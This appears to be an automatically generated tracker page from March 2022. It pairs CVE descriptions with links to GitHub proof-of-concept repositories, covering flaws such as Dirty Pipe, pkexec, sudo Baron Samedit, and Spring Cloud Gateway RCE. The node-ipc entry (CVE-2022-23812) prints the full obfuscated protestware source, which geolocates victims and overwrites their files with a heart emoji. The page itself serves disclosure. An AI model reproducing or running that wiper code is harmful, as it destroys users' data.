# Update 2022-03-19
## CVE-2022-24112
 An attacker can abuse the batch-requests plugin to send requests to bypass the IP restriction of Admin API. A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution. When the admin key was changed or the port of Admin API was changed to a port different from the data panel, the impact is lower. But there is still a risk to bypass the IP restriction of Apache APISIX's data panel. There is a check in the batch-requests plugin which overrides the client IP with its real remote IP. But due to a bug in the code, this check can be bypassed.

- [https://github.com/kavishkagihan/CVE-2022-24112-POC](https://github.com/kavishkagihan/CVE-2022-24112-POC) :  ![starts](https://img.shields.io/github/stars/kavishkagihan/CVE-2022-24112-POC.svg) ![forks](https://img.shields.io/github/forks/kavishkagihan/CVE-2022-24112-POC.svg)


## CVE-2022-23812
 This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from &quot;path&quot;; import a from &quot;fs&quot;; import o from &quot;https&quot;; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t &gt; 1) { return; } const n = Buffer.from(&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;, &quot;base64&quot;); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(&quot;utf8&quot;), function (t) { t.on(&quot;data&quot;, function (t) { const n = Buffer.from(&quot;Li8=&quot;, &quot;base64&quot;); const o = Buffer.from(&quot;Li4v&quot;, &quot;base64&quot;); const r = Buffer.from(&quot;Li4vLi4v&quot;, &quot;base64&quot;); const f = Buffer.from(&quot;Lw==&quot;, &quot;base64&quot;); const c = Buffer.from(&quot;Y291bnRyeV9uYW1l&quot;, &quot;base64&quot;); const e = Buffer.from(&quot;cnVzc2lh&quot;, &quot;base64&quot;); const i = Buffer.from(&quot;YmVsYXJ1cw==&quot;, &quot;base64&quot;); try { const s = JSON.parse(t.toString(&quot;utf8&quot;)); const u = s[c.toString(&quot;utf8&quot;)].toLowerCase(); const a = u.includes(e.toString(&quot;utf8&quot;)) || u.includes(i.toString(&quot;utf8&quot;)); // checks if country is Russia or Belarus if (a) { h(n.toString(&quot;utf8&quot;)); h(o.toString(&quot;utf8&quot;)); h(r.toString(&quot;utf8&quot;)); h(f.toString(&quot;utf8&quot;)); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = &quot;&quot;, o = &quot;&quot;) { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from(&quot;4p2k77iP&quot;, &quot;base64&quot;); for (var e = 0; e &lt; r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length &gt; 0 ? f.push(...s) : null; } else if (i.indexOf(o) &gt;= 0) { try { a.writeFile(i, c.toString(&quot;utf8&quot;), function () {}); // overwrites file with &#10084;&#65039; } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };

- [https://github.com/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812](https://github.com/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812) :  ![starts](https://img.shields.io/github/stars/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812.svg) ![forks](https://img.shields.io/github/forks/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812.svg)


## CVE-2022-22947
 In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.

- [https://github.com/Wrin9/CVE-2022-22947](https://github.com/Wrin9/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/Wrin9/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/Wrin9/CVE-2022-22947.svg)


## CVE-2022-22582
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.

- [https://github.com/poizon-box/CVE-2022-22582](https://github.com/poizon-box/CVE-2022-22582) :  ![starts](https://img.shields.io/github/stars/poizon-box/CVE-2022-22582.svg) ![forks](https://img.shields.io/github/forks/poizon-box/CVE-2022-22582.svg)


## CVE-2022-0847
 A flaw was found in the way the &quot;flags&quot; member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.

- [https://github.com/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits](https://github.com/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits) :  ![starts](https://img.shields.io/github/stars/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits.svg) ![forks](https://img.shields.io/github/forks/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits.svg)


## CVE-2021-4034
 A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

- [https://github.com/defhacks/cve-2021-4034](https://github.com/defhacks/cve-2021-4034) :  ![starts](https://img.shields.io/github/stars/defhacks/cve-2021-4034.svg) ![forks](https://img.shields.io/github/forks/defhacks/cve-2021-4034.svg)
- [https://github.com/4n0nym0u5dk/CVE-2021-4034](https://github.com/4n0nym0u5dk/CVE-2021-4034) :  ![starts](https://img.shields.io/github/stars/4n0nym0u5dk/CVE-2021-4034.svg) ![forks](https://img.shields.io/github/forks/4n0nym0u5dk/CVE-2021-4034.svg)


## CVE-2021-3156
 Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via &quot;sudoedit -s&quot; and a command-line argument that ends with a single backslash character.

- [https://github.com/RodricBr/CVE-2021-3156](https://github.com/RodricBr/CVE-2021-3156) :  ![starts](https://img.shields.io/github/stars/RodricBr/CVE-2021-3156.svg) ![forks](https://img.shields.io/github/forks/RodricBr/CVE-2021-3156.svg)


## CVE-2020-15175
 In GLPI before version 9.5.2, the `&#8203;pluginimage.send.php&#8203;` endpoint allows a user to specify an image from a plugin. The parameters can be maliciously crafted to instead delete the .htaccess file for the files directory. Any user becomes able to read all the files and folders contained in &#8220;/files/&#8221;. Some of the sensitive information that is compromised are the user sessions, logs, and more. An attacker would be able to get the Administrators session token and use that to authenticate. The issue is patched in version 9.5.2.

- [https://github.com/Xn2/GLPwn](https://github.com/Xn2/GLPwn) :  ![starts](https://img.shields.io/github/stars/Xn2/GLPwn.svg) ![forks](https://img.shields.io/github/forks/Xn2/GLPwn.svg)


## CVE-2020-2555
 Vulnerability in the Oracle Coherence product of Oracle Fusion Middleware (component: Caching,CacheStore,Invocation). Supported versions that are affected are 3.7.1.0, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle Coherence. Successful attacks of this vulnerability can result in takeover of Oracle Coherence. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

- [https://github.com/0xn0ne/weblogicScanner](https://github.com/0xn0ne/weblogicScanner) :  ![starts](https://img.shields.io/github/stars/0xn0ne/weblogicScanner.svg) ![forks](https://img.shields.io/github/forks/0xn0ne/weblogicScanner.svg)


## CVE-2020-1054
 An elevation of privilege vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory, aka 'Win32k Elevation of Privilege Vulnerability'. This CVE ID is unique from CVE-2020-1143.

- [https://github.com/Graham382/CVE-2020-1054](https://github.com/Graham382/CVE-2020-1054) :  ![starts](https://img.shields.io/github/stars/Graham382/CVE-2020-1054.svg) ![forks](https://img.shields.io/github/forks/Graham382/CVE-2020-1054.svg)


## CVE-2019-7609
 Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.

- [https://github.com/Cr4ckC4t/cve-2019-7609](https://github.com/Cr4ckC4t/cve-2019-7609) :  ![starts](https://img.shields.io/github/stars/Cr4ckC4t/cve-2019-7609.svg) ![forks](https://img.shields.io/github/forks/Cr4ckC4t/cve-2019-7609.svg)


## CVE-2018-6574
 Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2 allow &quot;go get&quot; remote command execution during source code build, by leveraging the gcc or clang plugin feature, because -fplugin= and -plugin= arguments were not blocked.

- [https://github.com/dmlino/cve-2018-6574](https://github.com/dmlino/cve-2018-6574) :  ![starts](https://img.shields.io/github/stars/dmlino/cve-2018-6574.svg) ![forks](https://img.shields.io/github/forks/dmlino/cve-2018-6574.svg)


## CVE-2017-11882
 Microsoft Office 2007 Service Pack 3, Microsoft Office 2010 Service Pack 2, Microsoft Office 2013 Service Pack 1, and Microsoft Office 2016 allow an attacker to run arbitrary code in the context of the current user by failing to properly handle objects in memory, aka &quot;Microsoft Office Memory Corruption Vulnerability&quot;. This CVE ID is unique from CVE-2017-11884.

- [https://github.com/tzwlhack/CVE-2017-11882](https://github.com/tzwlhack/CVE-2017-11882) :  ![starts](https://img.shields.io/github/stars/tzwlhack/CVE-2017-11882.svg) ![forks](https://img.shields.io/github/forks/tzwlhack/CVE-2017-11882.svg)


## CVE-2016-1828
 The kernel in Apple iOS before 9.3.2, OS X before 10.11.5, tvOS before 9.2.1, and watchOS before 2.2.1 allows attackers to execute arbitrary code in a privileged context or cause a denial of service (memory corruption) via a crafted app, a different vulnerability than CVE-2016-1827, CVE-2016-1829, and CVE-2016-1830.

- [https://github.com/berritus163t/bazad5](https://github.com/berritus163t/bazad5) :  ![starts](https://img.shields.io/github/stars/berritus163t/bazad5.svg) ![forks](https://img.shields.io/github/forks/berritus163t/bazad5.svg)

